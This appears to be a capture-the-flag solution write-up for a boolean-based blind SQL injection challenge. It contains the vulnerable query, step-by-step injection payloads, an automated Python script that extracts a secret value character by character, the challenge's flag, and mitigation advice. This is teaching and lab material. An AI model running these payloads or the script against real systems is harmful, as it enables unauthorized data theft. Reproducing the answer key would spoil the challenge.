# Challenge 12: BlindSearch - Solution

## Vulnerability Type
**Blind SQL Injection (Boolean-based)**

## Description
The application is vulnerable to SQL injection, but only returns boolean results (found/not found), requiring blind SQLi techniques to extract data.

## Vulnerable Code
```python
# VULNERABLE: raw string injection, but only returns boolean result
cur.execute(f"SELECT COUNT(*) FROM products WHERE name LIKE '%{q}%' AND visible=1")
```

## Exploitation Steps

The flag is stored in the `secrets` table with key='flag'. We need to extract it character by character using boolean-based blind SQLi.

### Step 1: Verify SQLi exists
```
' OR '1'='1
```
Result: "Products found" (always true)

### Step 2: Test if secrets table exists
```
' OR (SELECT COUNT(*) FROM secrets) > 0 AND '1'='1
```
Result: "Products found" (confirms table exists)

### Step 3: Extract flag length
```
' OR (SELECT LENGTH(value) FROM secrets WHERE key='flag') = 28 AND '1'='1
```
Try different numbers until you get "Products found"

### Step 4: Extract flag character by character
```
' OR (SELECT SUBSTR(value,1,1) FROM secrets WHERE key='flag') = 'F' AND '1'='1
```
Result: "Products found" (first character is 'F')

```
' OR (SELECT SUBSTR(value,2,1) FROM secrets WHERE key='flag') = 'C' AND '1'='1
```
Result: "Products found" (second character is 'C')

Continue for all characters...

## Automated Extraction Script (Python)
```python
import requests
import string

url = "http://[host]/"
flag = ""
charset = string.ascii_letters + string.digits + "{}_"

for pos in range(1, 30):
    for char in charset:
        payload = f"' OR (SELECT SUBSTR(value,{pos},1) FROM secrets WHERE key='flag') = '{char}' AND '1'='1"
        r = requests.get(url, params={"q": payload})
        if "Products found" in r.text:
            flag += char
            print(f"Found: {flag}")
            break
    if char == '}':
        break

print(f"Flag: {flag}")
```

## Flag
```
FCTF{bl1nd_sql1_1s_p4t13nt}
```

## How It Works
- The query concatenates user input without sanitization
- We can inject SQL conditions that return true/false
- By testing each character, we can extract data bit by bit
- This is "blind" because we don't see the actual data, just boolean results

## Mitigation
- Use parameterized queries:
  ```python
  cur.execute("SELECT COUNT(*) FROM products WHERE name LIKE ? AND visible=1", (f'%{q}%',))
  ```
- Never concatenate user input into SQL
- Implement input validation
- Use an ORM framework
- Apply principle of least privilege (limit DB user permissions)
- Implement rate limiting to slow down automated attacks
- Use Web Application Firewall (WAF)
